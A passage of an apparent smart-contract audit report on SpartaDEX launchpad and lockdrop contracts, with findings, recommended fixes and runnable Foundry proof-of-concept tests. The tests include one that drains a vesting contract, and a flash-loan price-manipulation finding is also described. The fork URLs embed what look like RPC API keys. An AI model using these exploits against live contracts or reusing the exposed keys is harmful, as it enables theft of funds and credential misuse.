nft.transferFrom(amelie, noemi, 1);\r\n    nft.transferFrom(amelie, noemi, 2);\r\n    nft.transferFrom(amelie, noemi, 3);\r\n\r\n    vm.stopPrank();\r\n\r\n    vm.startPrank(noemi);\r\n\r\n    fundraiser.depositWithWhitelistAndNft(3e18, amelieTokenIds);\r\n\r\n    assertEq(fundraiser.depositedAmount(noemi) == 63e18, true);\r\n  }\r\n}\r\n\r\n```\r\n\r\n**Recommendation:** To mitigate this vulnerability, it is advised to implement the following measures:\r\n\r\n1. Adjust the system to account for any changes to token ownership during the time of the fundraising.\r\n2. The `calculateMaxAllocation` function should be refactored so that the allocation is computed based solely on valid tokens. This means the system should exclude invalid tokens from the calculation, ensuring that only NFTs owned by the user and not marked as used are considered in the allocation. This can prevent users from taking advantage of invalid or used NFTs to gain an unfair share of allocation.\r\n\r\n## High Risk\r\n\r\n### [H-1] release() doesnt return excess fees\r\n\r\n**Context:** [Vesting.sol](https://github.com/SpartaDEX/sdex-launchpad-sc/blob/44ae03a132f40cdb90e7e8937eadca2cf2e29219/contracts/Vesting.sol#L55-L68)\r\n\r\n**Impact:** The impact is primarily financial, as the current implementation does not return any excess Ether (`msg.value`) paid beyond the required `ethFee`. Users who pay more than the required fee will not receive their excess payment back, leading to an unintended loss of funds.\r\n\r\n**Description:** In the `release()` function, the contract requires the users to pay a fee (`ethFee`) to release their tokens.\r\n\r\nHowever, it does not handle the situation where the user pays more (`msg.value`) than the required fee. Currently, if `msg.value > ethFee`, the contract simply accepts the payment without refunding the difference to the user.\r\n\r\nConsider the following scenario:\r\n\r\n1.  The `ethFee` is 0.1e18\r\n2.  A user sends 0.2e18 as `msg.value`\r\n3.  The fee is correctly charged at 0.1e18, but the user is not refunded the excess of 0.1e18\r\n\r\nAs a result, users may unknowingly overpay and lose Ether when using this function.\r\n\r\n```solidity\r\n   function release() external payable {\r\n        uint256 unreleased = releasableAmount(msg.sender);\r\n        require(unreleased > 0, "No tokens to release");\r\n        require(msg.value >= ethFee, "Insufficient fee: the required fee must be covered");\r\n\r\n        tokensReleased[msg.sender] = tokensReleased[msg.sender].add(unreleased);\r\n        if (\r\n            !config.token.transfer(msg.sender, unreleased)\r\n        ) {\r\n            revert TransferFailed();\r\n        }\r\n\r\n        // @audit-issue if msg.value >= ethFee, the function doesn\'t refund the user with the difference\r\n        emit TokensReleased(unreleased, msg.sender);\r\n    }\r\n\r\n```\r\n\r\n**Recommendation:** Return the difference to the user\r\n\r\n```diff\r\n+       uint256 dust = msg.value - ethFee;\r\n+       (bool sent, ) = address(msg.sender).call{value: dust}("");\r\n+       require(sent, "Failed to send Ether");\r\n```\r\n\r\n## Medium Risk\r\n\r\n### [M-1] Inaccurate timing mechanism for daily token claim\r\n\r\n**Context:** [TokenFaucet.sol](https://github.com/SpartaDEX/sdex-launchpad-sc/blob/44ae03a132f40cdb90e7e8937eadca2cf2e29219/contracts/TokenFaucet.sol#L22-L51)\r\n\r\n**Description:** The `claimTokens` function within the smart contract was designed to allow users to claim a certain amount of tokens within a day.\r\n\r\nHowever, the timing mechanism isn\'t truly \'daily\' but rather depends on the last time the user claimed tokens.\r\n\r\nThis means if a user claims tokens multiple times within a 24-hour period, the time for the next \'daily\' limit reset will be pushed further ahead, causing potential confusion and token loss.\r\n\r\n```solidity\r\n    function claimTokens(uint256 _amount) external {\r\n        uint256 timeSinceLastClaim = block.timestamp - lastClaim[msg.sender];\r\n\r\n        // If you haven\'t claimed in a day, your claimed tokens get reset.\r\n        if (timeSinceLastClaim >= DAY_IN_SECONDS) {\r\n            claimedTokens[msg.sender] = 0;\r\n        }\r\n\r\n        // Available tokens in a day\r\n        uint256 availableTokens = dailyLimit - claimedTokens[msg.sender];\r\n\r\n        // Claimable tokens since the last claim\r\n        uint256 claimableTokens = (dailyLimit * timeSinceLastClaim) / DAY_IN_SECONDS;\r\n\r\n        if (claimableTokens > availableTokens) {\r\n            claimableTokens = availableTokens;\r\n        }\r\n\r\n        require(_amount <= claimableTokens, "Claim limit exceeded");\r\n\r\n        claimedTokens[msg.sender] += _amount;\r\n\r\n        // Set last claim to **now**\r\n        lastClaim[msg.sender] = block.timestamp;\r\n\r\n        // @audit-issue check the return value\r\n        token.transfer(msg.sender, _amount);\r\n\r\n        emit Claimed(msg.sender, _amount);\r\n    }\r\n```\r\n\r\nConsider the following scenario:\r\n\r\n1. The daily token limit is 100e18.\r\n2. Amelie claims 50e18. The `lastClaim[amelie]` variable is set to now, so in 24 hours she will be due **another** 100e18 from the **next daily limit**\r\n3. 12 hours after the first claim, Amelie claims the other 50e18 from her **current** daily limit.\r\n4. 12 more hours pass and her daily limit should have been reset, so on theory she should be due 100e18 more.\r\n5. However, because she did a second claim 12h after her first one, her "daily" limit actually became a "day and a half" limit. Hence, if she attempts to claim now, the function will assume that she exceeded her claim limit\r\n\r\nThe issue arises from these lines in the contract:\r\n\r\n```solidity\r\n    uint256 timeSinceLastClaim = block.timestamp - lastClaim[msg.sender];\r\n\r\n    // If you haven\'t claimed in a day, your claimed tokens get reset.\r\n    if (timeSinceLastClaim >= DAY_IN_SECONDS) {\r\n        claimedTokens[msg.sender] = 0;\r\n    }\r\n```\r\n\r\nHere\'s a runnable PoC that showcases the issue:\r\n\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.15;\r\nimport "openzeppelin/contracts/token/ERC20/IERC20.sol";\r\nimport "openzeppelin/contracts/access/Ownable.sol";\r\nimport "forge-std/Test.sol";\r\n\r\n\r\ncontract DailyTokenClaim is Ownable {\r\n    uint256 public dailyLimit;\r\n    uint256 constant public DAY_IN_SECONDS = 86400;\r\n\r\n    mapping(address => uint256) public lastClaim;\r\n    mapping(address => uint256) public claimedTokens;\r\n\r\n    event Claimed(address indexed claimer, uint256 amount);\r\n\r\n    constructor(uint256 _dailyLimit) {\r\n        dailyLimit = _dailyLimit;\r\n    }\r\n\r\n    function claimTokens(uint256 _amount) external {\r\n        uint256 timeSinceLastClaim = block.timestamp - lastClaim[msg.sender];\r\n\r\n        // If you haven\'t claimed in a day, your claimed tokens get reset.\r\n        if (timeSinceLastClaim >= DAY_IN_SECONDS) {\r\n            claimedTokens[msg.sender] = 0;\r\n        }\r\n\r\n        // Available tokens in a day\r\n        uint256 availableTokens = dailyLimit - claimedTokens[msg.sender];\r\n\r\n        // 1. 50 tokens left\r\n\r\n        // Claimable tokens since the last claim\r\n        uint256 claimableTokens = (dailyLimit * timeSinceLastClaim) / DAY_IN_SECONDS;\r\n        console.log(availableTokens);\r\n        console.log("claimableTokens: %s", claimableTokens);\r\n\r\n        if (claimableTokens > availableTokens) {\r\n            claimableTokens = availableTokens;\r\n        }\r\n\r\n        require(_amount <= claimableTokens, "Claim limit exceeded");\r\n\r\n        claimedTokens[msg.sender] += _amount;\r\n\r\n        // Set last claim to **now**\r\n        lastClaim[msg.sender] = block.timestamp;\r\n\r\n        console.log(_amount);\r\n\r\n        emit Claimed(msg.sender, _amount);\r\n    }\r\n\r\n    function setDailyLimit(uint256 _newDailyLimit) external onlyOwner {\r\n        dailyLimit = _newDailyLimit;\r\n    }\r\n}\r\n\r\ncontract Test28 is Test {\r\n  DailyTokenClaim claimer;\r\n\r\n  address amelie = makeAddr("amelie");\r\n\r\n  function setUp() public {\r\n    vm.createSelectFork("https://eth.llamarpc.com/rpc/01GYVK2PRR9PG6E3KP7P8DSEFX");\r\n    claimer = new DailyTokenClaim(100e18);\r\n  }\r\n\r\n  function test_unfairAllocation() external {\r\n    vm.startPrank(amelie);\r\n\r\n    // Amelie claims 50 tokens\r\n    claimer.claimTokens(50e18);\r\n\r\n    // Limit resets in 1 day\r\n    uint256 dailyLimitResetForAmelie = claimer.lastClaim(amelie) + 86400;\r\n\r\n    // Move time forward 12 hours\r\n    vm.warp(block.timestamp + 43200);\r\n\r\n    // Amelie claims 50 tokens\r\n    claimer.claimTokens(50e18);\r\n\r\n    vm.warp(block.timestamp + 43201);\r\n    claimer.claimTokens(50e18);\r\n\r\n    // Limit is increased to 1 day + 12 hours.\r\n  }\r\n}\r\n\r\n```\r\n\r\n**Recommendation:** One feasible approach to resolving this issue would be to automatically transfer the maximum claimable amount to users, instead of permitting them to specify the amount themselves. This can prevent potential misunderstandings and token loss caused by the current claim system.\r\n\r\nAn alternative suggestion would involve modifying your claim mechanism to reset the amount of claimable tokens at a specific, fixed time (for instance, midnight UTC), rather than basing it on the timestamp of the last claim. This change would guarantee a uniform 24-hour day for all users, independent of their individual claim timings.\r\n\r\nFinally, consider implementing a rolling window for claim limits. This system could involve recording each claim\'s timestamp and amount over a 24-hour period. Prior to each claim, you would tally all the tokens claimed within the previous 24 hours, eliminating any claims that fall outside this timeframe. Though this method might require additional computational resources, it would ensure accurate enforcement of the daily claim limit, irrespective of when claims are made.\r\n\r\n### [M-2] Possibility of overwriting the current vesting\r\n\r\n**Context:** [Fundraiser.sol](https://github.com/SpartaDEX/sdex-launchpad-sc/blob/44ae03a132f40cdb90e7e8937eadca2cf2e29219/contracts/Fundraiser.sol#L201-L221)\r\n\r\n**Impact:** The vulnerability allows overwriting of an existing vesting contract when the `startVesting` function is called multiple times.\r\n\r\n**Description:** The `startVesting` function creates a new instance of the `Vesting` contract, specifying the vesting start and end timestamps, token address, Ether fee, and owner\'s address. The address of the new `Vesting` contract instance is stored in `vestingAddress`.\r\n\r\n```solidity\r\n   function startVesting(uint256 _vestingStart, uint256 _vestingEnd, address _tokenAddress, uint256 _tokenAmount, uint256 _ethFee) external whenNotPaused onlyOwner {\r\n        Vesting vesting = new Vesting(\r\n            address(this),\r\n            _vestingStart,\r\n            _vestingEnd,\r\n            _tokenAddress,\r\n            _ethFee,\r\n            owner()\r\n        );\r\n\r\n        vestingAddress = address(vesting);\r\n\r\n        if (\r\n            !IERC20(_tokenAddress).transferFrom(msg.sender, vestingAddress, _tokenAmount)\r\n        ) {\r\n            revert TransferFailed();\r\n        }\r\n\r\n        emit VestingDeployed(vestingAddress);\r\n    }\r\n```\r\n\r\nThe issue here that even if a vesting is started and the function is called again, it will overwrite the previous vesting\r\n\r\n**Recommendation:** To mitigate the vulnerability, it is recommended to add a check before creating a new vesting contract. If a vesting contract for a fundraiser already exists, the function should revert instead of creating a new contract. This ensures that only one vesting contract is created per fundraiser.\r\n\r\n```diff\r\n   function startVesting(uint256 _vestingStart, uint256 _vestingEnd, address _tokenAddress, uint256 _tokenAmount, uint256 _ethFee) external whenNotPaused onlyOwner {\r\n+      require(vestingAddress == address(0), "Vesting already exists")\r\n    }\r\n\r\n```\r\n\r\n## Low Risk\r\n\r\n### [L-1] Ensure that nftStartTime > openStartTime\r\n\r\n**Context:** [Fundraiser.sol](https://github.com/SpartaDEX/sdex-launchpad-sc/blob/44ae03a132f40cdb90e7e8937eadca2cf2e29219/contracts/Fundraiser.sol#L91-L111)\r\n\r\n**Impact:** The current implementation of the contract lacks a restriction that enforces the condition stated in the readme regarding the `nftStartTime` variable.\r\n\r\n**Description**\r\n\r\nAccording to the readme, the `nftStartTime` should represent a period where users holding NFTs are allowed to deposit before users who do not hold NFTs. However, as it stands, there are no checks in place to ensure this condition is met during the initialization of the contract.\r\n\r\nHowever, currently there are no restrictions that actually force this when assigning the variables.\r\n\r\n```solidity\r\n constructor(\r\n        address _depositToken,\r\n        uint256 _baseAllocationPerWallet,\r\n        uint256 _maxTotalAllocation,\r\n        uint256 _nftTicketAllocation,\r\n        uint256 _rate,\r\n        uint256 _nftFundraiseStartTime,\r\n        uint256 _openFundraiseStartTime,\r\n        uint256 _fundraiseEndTime,\r\n        uint256 _distributionStartTime,\r\n        address _owner,\r\n        address _factory,\r\n        address _nftToken\r\n    ) {\r\n        tokenConfig.depositToken = _depositToken;\r\n        allocationConfig.baseAllocationPerWallet = _baseAllocationPerWallet;\r\n        allocationConfig.maxTotalAllocation = _maxTotalAllocation;\r\n        allocationConfig.nftTicketAllocation = _nftTicketAllocation;\r\n        allocationConfig.rate = _rate;\r\n        timeConfig.nftStartTime = _nftFundraiseStartTime;\r\n        timeConfig.openStartTime = _openFundraiseStartTime;\r\n        timeConfig.endTime = _fundraiseEndTime;\r\n        timeConfig.distributionStartTime = _distributionStartTime;\r\n        tokenConfig.factory = _factory;\r\n        nftToken = _nftToken;\r\n        _transferOwnership(_owner);\r\n    }\r\n```\r\n\r\n**Recommendation:** Ensure that `nftStartTime` > `openStartTime` when initializing the contract.\r\n\r\n````diff\r\n+        require(timeConfig.nftStartTime > timeConfig.openStartTime, "NFT fundraise start time must be greater than open fundraise start time");\r\n\r\n\r\n\r\n\r\n### [L-2] Lack of restriction on vesting start before fundraising ends\r\n\r\n**Context:** [Fundraiser.sol](https://github.com/SpartaDEX/sdex-launchpad-sc/blob/44ae03a132f40cdb90e7e8937eadca2cf2e29219/contracts/Fundraiser.sol#L201-L221)\r\n\r\n**Impact** The current implementation of the `Fundraiser` contract lacks restrictions to ensure that the vesting process can only be started after the fundraising period has ended. This vulnerability allows the vesting to be initiated before the fundraising period concludes.\r\n\r\n**Description:** The `startVesting` function in the `Fundraiser` contract allows the owner to commence the vesting process by specifying the vesting start and end times, along with other parameters.\r\n\r\nHowever, there are no checks in place to prevent the vesting from being initiated if the fundraising period has not yet ended.\r\n\r\n**Recommendation:** To mitigate this vulnerability, it is advised to add a restriction that ensures the vesting process can only be initiated once the fundraising period has concluded. The following modification can be applied to the code:\r\n\r\n```diff\r\n    function startVesting(uint256 _vestingStart, uint256 _vestingEnd, address _tokenAddress, uint256 _tokenAmount, uint256 _ethFee) external whenNotPaused onlyOwner {\r\n+        require(block.timestamp > timeConfig.endTime, "Fundraise has not ended yet");\r\n````\r\n',pdfLink:"https://github.com/bytes032/reports/blob/main/SPD-Launchpad.pdf"},{slug:"spdlockair",title:"SpartaDEX Lockdrop Airdrop",description:"SpartaDEX is a combination of real-time strategy game set in the realities of ancient Greece and a decentralized cryptocurrency exchange. They call it a gamified DEX. The main goal is to provide the exchange with user engagement known from video games, which builds loyalty and consistency in providing liquidity.SpartaDEX Lockdrop is their strategy of launching the DEX with the goal to kick-start the TVL (liquidity) by incen- tivizing those who will transfer and lock their LP in SpartaDEX.",createdAt:"2023-05-20T03:52:32.356Z",findings:18,body:'---\r\n\r\n# Findings\r\n\r\n## Critical Risk\r\n\r\n### [C-1] A malicious user can drain all the funds from the TokenVesting contract\r\n\r\n**Context:** [TokenVesting.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/vesting/TokenVesting.sol#L77-L93)\r\n\r\n**Impact:** This vulnerability allows a malicious actor to drain the entire TokenVesting contract of its tokens prematurely. The issue arises from the lack of a proper check for whether the vesting schedule duration has elapsed.\r\n\r\n**Description:** The claim function in the TokenVesting contract calculates the amount of claimable tokens based on the elapsed time since the start of the vesting schedule. The function assumes the vesting schedule is not over without validating this assumption, allowing users to claim more tokens than they should be entitled to at any point in time.\r\n\r\nWhen the claim function is called, it calculates the vested amount based on the elapsed time and the total vesting duration. However, it does not check whether the elapsed time has exceeded the vesting duration. This oversight allows a user to claim tokens that should not yet be available for withdrawal, leading to the potential theft of all tokens in the contract.\r\n\r\nThe problematic code block is as follows:\r\n\r\n```solidity\r\n// @audit-issue there\'s no check if the vesting schedule is over\r\nuint256 elapsedTime = block.timestamp - vestingSchedule.startTime;\r\nuint256 vestingDuration = vestingSchedule.endTime - vestingSchedule.startTime;\r\nuint256 vestedAmount = (vestingSchedule.totalAmount * elapsedTime) / vestingDuration;\r\n\r\nuint256 unclaimedAmount = vestedAmount - vestingSchedule.claimedAmount;\r\n```\r\n\r\nThe provided proof-of-concept demonstrates how an attacker could exploit this vulnerability to claim all tokens in the contract:\r\n\r\n```solidity\r\n// SPDX-License-Identifier: UNLICENSED\r\npragma solidity ^0.8.13;\r\nimport "forge-std/Test.sol";\r\nimport "forge-std/console.sol";\r\nimport "@openzeppelin/contracts/token/ERC20/ERC20.sol";\r\nimport "@openzeppelin/contracts/token/ERC20/IERC20.sol";\r\n\r\ninterface ITokenVesting {\r\n    error InvalidScheduleID();\r\n    error VestingNotStarted();\r\n    error AllTokensClaimed();\r\n    error ZeroTokens();\r\n    error ZeroDuration();\r\n    error TransferFailed();\r\n    error NothingToClaim();\r\n\r\n    event VestingAdded(\r\n        address indexed beneficiary,\r\n        uint256 indexed allocationId,\r\n        uint256 startTime,\r\n        uint256 endTime,\r\n        uint256 amount\r\n    );\r\n\r\n    event TokenWithdrawn(\r\n        address indexed beneficiary,\r\n        uint256 indexed allocationId,\r\n        uint256 value\r\n    );\r\n\r\n    struct Vesting {\r\n        uint256 startTime;\r\n        uint256 endTime;\r\n        uint256 totalAmount;\r\n        uint256 claimedAmount;\r\n    }\r\n\r\n    function addVesting(\r\n        address beneficiary,\r\n        uint256 startTime,\r\n        uint256 duration,\r\n        uint256 amount\r\n    ) external;\r\n\r\n    function claim(uint256[] calldata scheduleIds) external;\r\n}\r\n\r\n\r\ncontract TokenVesting is ITokenVesting {\r\n    IERC20 public immutable token;\r\n    mapping(address => Vesting[]) public vestingSchedules;\r\n\r\n    constructor(IERC20 _token) {\r\n        token = _token;\r\n    }\r\n\r\n    function addVesting(\r\n        address beneficiary,\r\n        uint256 startTime,\r\n        uint256 duration,\r\n        uint256 amount\r\n    ) public {\r\n        if (amount == 0) {\r\n            revert ZeroTokens();\r\n        }\r\n        if (duration == 0) {\r\n            revert ZeroDuration();\r\n        }\r\n\r\n        if (!token.transferFrom(msg.sender, address(this), amount)) {\r\n            revert TransferFailed();\r\n        }\r\n\r\n        uint256 endTime = startTime + duration;\r\n\r\n        vestingSchedules[beneficiary].push(\r\n            Vesting({\r\n                startTime: startTime,\r\n                endTime: endTime,\r\n                totalAmount: amount,\r\n                claimedAmount: 0\r\n            })\r\n        );\r\n\r\n        emit VestingAdded(\r\n            beneficiary,\r\n            vestingSchedules[beneficiary].length - 1,\r\n            startTime,\r\n            endTime,\r\n            amount\r\n        );\r\n    }\r\n\r\n    function claim(uint256[] calldata scheduleIds) public {\r\n        uint256 claimableAmount = 0;\r\n        Vesting[] storage schedules = vestingSchedules[msg.sender];\r\n        uint256 scheduleIdsLength = schedules.length;\r\n\r\n        // @audit-info the function will revert if there is a\r\n        // "invalid" schedule, while all others might be fine\r\n        for (uint256 i = 0; i < scheduleIdsLength; i++) {\r\n            uint256 id = scheduleIds[i];\r\n\r\n            if (id >= schedules.length) {\r\n                revert InvalidScheduleID();\r\n            }\r\n\r\n            Vesting storage vestingSchedule = schedules[id];\r\n\r\n            if (block.timestamp < vestingSchedule.startTime) {\r\n                revert VestingNotStarted();\r\n            }\r\n\r\n            if (vestingSchedule.totalAmount <= vestingSchedule.claimedAmount) {\r\n                revert AllTokensClaimed();\r\n            }\r\n\r\n            // @audit-issue there\'s no check if the vesting schedule is over\r\n            uint256 elapsedTime = block.timestamp - vestingSchedule.startTime;\r\n            uint256 vestingDuration = vestingSchedule.endTime -\r\n                vestingSchedule.startTime;\r\n            uint256 vestedAmount = (vestingSchedule.totalAmount * elapsedTime) /\r\n                vestingDuration;\r\n\r\n            console.log(vestedAmount);\r\n            uint256 unclaimedAmount = vestedAmount -\r\n                vestingSchedule.claimedAmount;\r\n\r\n            if (unclaimedAmount > 0) {\r\n                vestingSchedule.claimedAmount = vestedAmount;\r\n                claimableAmount += unclaimedAmount;\r\n\r\n                emit TokenWithdrawn(msg.sender, id, unclaimedAmount);\r\n            }\r\n        }\r\n\r\n        if (claimableAmount == 0) {\r\n            revert NothingToClaim();\r\n        }\r\n        if (!token.transfer(msg.sender, claimableAmount)) {\r\n            revert TransferFailed();\r\n        }\r\n    }\r\n}\r\n\r\n\r\ncontract ERC20MintableToken is ERC20 {\r\n    constructor(\r\n        string memory _symbol,\r\n        string memory _name\r\n    ) ERC20(_symbol, _name) {}\r\n\r\n    /**\r\n     * @dev Function to mint tokens\r\n     * @param to The address that will receive the minted tokens.\r\n     * @param value The amount of tokens to mint.\r\n     * @return A boolean that indicates if the operation was successful.\r\n     */\r\n\r\n    function mint(address to, uint256 value) public returns (bool) {\r\n        _mint(to, value);\r\n        return true;\r\n    }\r\n}\r\n\r\n\r\ncontract InflatedRewardsTest is Test {\r\n    ERC20MintableToken token;\r\n    TokenVesting vesting;\r\n    address amelie = makeAddr("amelie");\r\n    address noemi = makeAddr("noemie");\r\n\r\n    function setUp() public {\r\n        vm.createSelectFork("https://arb-mainnet.g.alchemy.com/v2/UVXidxBjyLOdMXEJxYtCMqqEkHATR2gQ");\r\n        token = new ERC20MintableToken("Test", "TEST");\r\n        vesting = new TokenVesting(token);\r\n    }\r\n\r\n    function testInflatedRewards() external {\r\n        // Noemi vests 100k tokens\r\n        vm.startPrank(noemi);\r\n        token.mint(noemi, 100_000e18);\r\n        token.approve(address(vesting), 100_000e18);\r\n        vesting.addVesting(noemi, block.timestamp, 90 days, 100_000e18);\r\n        vm.stopPrank();\r\n\r\n        assertEq(token.balanceOf(address(vesting)), 100_000e18);\r\n\r\n        vm.warp(block.timestamp + 1 days);\r\n\r\n        // Amelie vests 10k tokens\r\n        vm.startPrank(amelie);\r\n        token.mint(amelie, 10_000e18);\r\n        token.approve(address(vesting), 10_000e18);\r\n        vesting.addVesting(amelie, block.timestamp, 1, 10_000e18);\r\n\r\n        assertEq(token.balanceOf(address(vesting)), 110_000e18);\r\n\r\n        vm.warp(block.timestamp + 11 seconds);\r\n\r\n        uint256[] memory scheduleIds = new uint256[](1);\r\n        scheduleIds[0] = 0;\r\n\r\n        // amelie steals all the tokens in the contract\r\n        vesting.claim(scheduleIds);\r\n\r\n        assertEq(token.balanceOf(amelie), 110_000e18);\r\n\r\n        assertEq(token.balanceOf(address(vesting)), 0);\r\n    }\r\n}\r\n\r\n```\r\n\r\n**Recommendation**\r\n\r\nTo fix this vulnerability, a check should be added to ensure the elapsed time does not exceed the vesting duration before calculating the vested amount. This can be done by adding a conditional statement to verify if `block.timestamp` is greater than `vestingSchedule.endTime`.\r\n\r\nHere is an example of how this can be implemented:\r\n\r\n```solidity\r\nuint256 elapsedTime;\r\nif (block.timestamp < vestingSchedule.endTime) {\r\n    elapsedTime = block.timestamp - vestingSchedule.startTime;\r\n} else {\r\n    elapsedTime = vestingSchedule.endTime - vestingSchedule.startTime;\r\n}\r\n\r\nuint256 vestingDuration = vestingSchedule.endTime - vestingSchedule.startTime;\r\nuint256 vestedAmount = (vestingSchedule.totalAmount * elapsedTime) / vestingDuration;\r\n```\r\n\r\n### [C-2] \\_getLPTokenPrice can be manipulated through a flash loan\r\n\r\n**Context:** [LockdropPhase1.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase1.sol#L500-L514)\r\n\r\n**Impact**\r\n\r\nThis vulnerability allows for manipulation of the Total Value Locked (TVL) and Liquidity Provider (LP) token price. If exploited, it could lead to incorrect pricing of LP tokens and potentially significant financial loss to users and the platform itself. It could also damage the platform\'s reputation and user trust.\r\n\r\n```solidity\r\n  function _getLPTokenPrice(\r\n        uint256 _tokenIndex\r\n    ) internal view returns (uint256) {\r\n        IUniswapV2Pair lpToken = lockingTokens[_tokenIndex].token;\r\n        (uint112 _reserve0, uint112 _reserve1, ) = lpToken.getReserves();\r\n        (uint112 reserveA, uint112 reserveB) = lpToken.token0() == tokenAAddress\r\n            ? (_reserve0, _reserve1)\r\n            : (_reserve1, _reserve0);\r\n        uint256 totalValueA = uint256(reserveA) * tokenAPrice;\r\n        uint256 totalValueB = uint256(reserveB) * tokenBPrice;\r\n        uint256 totalValueLP = totalValueA + totalValueB;\r\n        uint256 lpTokenSupply = lpToken.totalSupply();\r\n        uint256 lpTokenPrice = totalValueLP / lpTokenSupply;\r\n        return lpTokenPrice;\r\n    }\r\n\r\n```\r\n\r\n**Description**\r\n\r\nThe vulnerability lies within the getLPTokenPrice algorithm of Sparta\'s system. The TVL computation, `r0 * p0 + r1 * p1`, does not account for a constant `k` in its equation. Thus, the TVL doesn\'t necessarily stay constant as the equation suggests. When plotted, the TVL function has its global minimum at `r0_min = sqrt(k*p1/p0)` around 110M $.\r\n\r\nThe absence of explicit `k` in the equation and the ease of obtaining a multi-million dollar flash loan allows a user to freely "move" to a different point on the curve. This means a malicious user could exploit this by dumping a large amount of any token into the pool. Such an action would significantly increase the TVL and, subsequently, the price of an LP token (TVL divided by total LP supply).\r\n\r\nhttps://rekt.news/warp-finance-rekt/\r\n\r\n**Recommendation**\r\n\r\nTo mitigate this vulnerability, the following recommendations are proposed:\r\n\r\n1.  Update the getLPTokenPrice algorithm to derive ideal reserve values from K and the underlying prices\r\n2.  Implement safeguards against rapid and large changes in the TVL that could be indicative of manipulative actions.\r\n3.  Consider introducing limits or controls on the amount of tokens a user can add to the pool at a given time.\r\n\r\nAdditionaly, you can take inspiration from this [UniswapV2Oracle](https://github.com/AlphaFinanceLab/alpha-homora-v2-contract/blob/master/contracts/oracle/UniswapV2Oracle.sol) by Alpha Homora.\r\n\r\n### [C-3] An adversary can lock user funds by spamming vesting schedules\r\n\r\n**Context:** [TokenVesting.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/vesting/TokenVesting.sol#L15-L51)\r\n\r\n**Impact**\r\n\r\nThe way the `claim` function is currently implemented, it iterates over all vesting schedules of a user, regardless of the `scheduleIds` specified. This could potentially lead to a Denial of Service (DoS) attack if a malicious actor spams the `schedules` of an arbitrary user with a large number of vesting schedules. As a result, the targeted user\'s `claim` function call **will** run out of gas, effectively preventing them from claiming **any** of their vested tokens.\r\n\r\n**Description**\r\n\r\nThe `addVesting` function is used to create vesting schedules for beneficiaries. This function is used by the `LockdropPhase1` contract when users receive rewards, with half of them sent to the vesting contract.\r\n\r\nHowever, the `addVesting` function can also be called by anyone to generate third-party vesting schedules. This opens the door for an attacker to add numerous vesting schedules to a user\'s account, leading to gas inefficiencies when the user tries to claim their vested tokens.\r\n\r\nIn the `claim` function, the function loops over all vesting schedules of a user, even if the user only specified a subset of these schedules in the `scheduleIds` parameter. This could cause the function to run out of gas if the user has a large number of vesting schedules, particularly if these were added by a malicious actor.\r\n\r\n```solidity\r\n function claim(uint256[] calldata scheduleIds) public {\r\n        uint256 claimableAmount = 0;\r\n        Vesting[] storage schedules = vestingSchedules[msg.sender];\r\n        uint256 scheduleIdsLength = schedules.length;\r\n\r\n        for (uint256 i = 0; i < scheduleIdsLength; i++) {\r\n            uint256 id = scheduleIds[i];\r\n\r\n            if (id >= schedules.length) {\r\n                revert InvalidScheduleID();\r\n            }\r\n\r\n            Vesting storage vestingSchedule = schedules[id];\r\n```\r\n\r\n**Recommendation**\r\n\r\nTo mitigate this potential issue, the `claim` function should be refactored to loop over only the `scheduleIds` specified by the user, rather than all vesting schedules associated with the user. This can be achieved by changing the `scheduleIdsLength` variable to be the length of the `scheduleIds` array, rather than the length of the user\'s `schedules` array.\r\n\r\nHere\'s how the changes would look like:\r\n\r\n```diff\r\n        Vesting[] storage schedules = vestingSchedules[msg.sender];\r\n+       uint256 scheduleIdsLength = scheduleIds.length;\r\n\r\n        for (uint256 i = 0; i < scheduleIdsLength; i++) {\r\n            uint256 id = schedules[scheduleIds[i]];\r\n\r\n            ...\r\n\r\n            Vesting storage vestingSchedule = schedules[id];\r\n```\r\n\r\n### [C-4] Excessive user allocations can DoS the calculateTotalReward function and deprive the user from rewards\r\n\r\n**Context:** [LockdropPhase1.sol](https://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase1.sol#L233-L260)\r\n\r\n**Impact:** The presence of this vulnerability may discourage users from making numerous allocations, as it could potentially leave them unable to access their rewards. This issue stems from a scenario where a user has a significant number of allocations, leading to the exhaustion of gas in the `calculateTotalReward` function.\r\n\r\n**Description:** The `lock` function allows a user to lock a specified amount of tokens until a certain timestamp, potentially with a boost calculated based on the token index and the value.\r\n\r\nFirst, it updates the user allocation counter and then updates the user\'s allocation itself, including the value, boost, token, unlock timestamp index, and points,\r\n\r\nhttps://github.com/SpartaDEX/sdex-smart-contracts/blob/27d41915ff88f798123c47a04af5f3bff3b5fe83/contracts/lockdrop/LockdropPhase1.sol#L112-L128\r\n\r\n```solidity\r\n        totalPointsInRound[stampId] += points;\r\n        }\r\n\r\n        IUniswapV2Pair token = lockingTokens[_tokenIndex].token;\r\n        if (!token.transferFrom(msg.sender, address(this), _value)) {\r\n            revert TransferFailed();\r\n        }\r\n\r\n        uint256 nextWalletAllocations = ++userAllocationsCount[msg.sender];\r\n        userAllocations[msg.sender][nextWalletAllocations] = UserAllocation({\r\n            taken: false,\r\n            value: _value,\r\n            boost: boost,\r\n            token: token,\r\n            unlockTimestampIndex: _lockingExpirationTimestampIndex,\r\n            points: points\r\n        });\r\n```\r\n\r\nThen, the total reward for the user is calculated through the `calculateTotalReward` function. The `calculateTotalReward` function iterates over all the allocations for a given user. If a user has a high number of allocations, the loop operation can exceed the gas limit, causing the function to fail. This is a problem as the `calculateTotalReward` function is fundamental to the `getRewardAndSendOnVesting` and `allocateRewardOnLockdropPhase2` functions. Consequently, a user may be unable to claim their rewards due to this vulnerability.\r\n\r\n```solidity\r\n function calculateTotalReward(\r\n        address _wallet\r\n    )\r\n        public\r\n        view\r\n        atLeastTheLockdropState(LockdropState.REWARD_RATES_CALCULATED)\r\n        returns (uint256)\r\n    {\r\n        uint256 reward = 0;\r\n\r\n        // @audit-issue will DoS if too many allocations\r\n        uint256 allocationsLength = userAllocationsCount[_wallet];\r\n        for (\r\n            uint256 allocationId = 1;\r\n            allocationId <= allocationsLength;\r\n            ++allocationId\r\n        ) 